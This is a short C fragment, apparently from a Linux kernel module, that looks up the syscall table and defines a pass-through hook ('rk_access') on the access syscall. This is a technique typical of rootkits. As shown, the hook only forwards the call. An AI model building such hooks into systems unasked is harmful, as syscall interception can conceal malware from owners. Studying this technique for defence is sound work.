#include "syscalls.h"

unsigned long *find_syscall_table(void)
{
    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
}

asmlinkage long rk_access(const struct pt_regs *pt_regs)
{
    const char __user *filename = (const char __user *)pt_regs->di;
    int mode = (int)pt_regs->si;
    // pr_info("Access: %s\n", filename);
    return orig_access(pt_regs);
}